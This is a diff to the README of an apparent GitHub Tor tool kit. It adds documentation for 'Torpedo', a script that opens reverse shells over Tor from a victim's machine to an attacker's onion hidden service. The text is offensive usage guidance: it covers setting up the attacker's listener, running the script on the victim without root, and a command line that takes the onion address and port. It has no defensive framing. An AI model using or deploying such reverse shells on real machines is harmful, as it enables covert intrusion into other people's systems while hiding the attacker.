@@ -2,6 +2,7 @@ Well this is just an tor related's tool kit. I pretend to collect some interesti
 I pretend to include here:
 - TorHost: An simple script that I made for manage ephemeral hidden services (mainly for listener purposes, but u can do whatever u want with it).
 - Torete: An script to manage tor connections.
+- Torpedo: Reverse shells over Tor.
 
 # Torhost.sh
 Is an easy way to create and manage ephemeral hidden services for do whatever u want to do. It's mainly thinked for listener purposes but you know.
@@ -44,6 +45,35 @@ This script has been tested on Debian, Kali, and Parrot, but can work on other s
 ```
 
 ![image](https://github.com/el10tt/tor-tools/assets/124470922/936ab6cc-089e-48c5-935f-7ac67b4f14da)
+
+
+
+# Torpedo.sh
+Is an easy way to launch reverse shells over Tor, just download tor portable version, execute its, and trhow reverse shell trough tor proxy.
+It can be executed without root privileges, Its a nice one since there aren't so much reverse shells over Tor on the Internet.
+
+#### Usage/Examples
+
+First of all you need a hidden service (in attacker machine) to receive the reverse shell, you can manage this hidden service with torhost.sh.
+You need to bind the hidden service with the listener local port, you can do it with torhost.sh aswell.
+When you got listener ready, just execute torpedo.sh in victim's machine, and just wait for your shell.
+You can hardcode hidden service parameters in the script body or you can enter'them as parameter
+
+```bash
+. bash torpedo.sh
+. bash torpedo.sh onionhiddenservice.onion 80
+```
+
+#### Listener
+
+![image](https://github.com/el10tt/tor-tools/assets/124470922/3883d085-2ff6-4196-aaa3-a12647f030a9)
+
+#### Torpedo (victim machine)
+
+![image](https://github.com/el10tt/tor-tools/assets/124470922/c47e5b87-9fd4-4363-b2de-78681d264160)
+![image](https://github.com/el10tt/tor-tools/assets/124470922/dfb8cbf0-d0a4-484a-bdc5-87e38ddc1330)
+
+
 
 
 
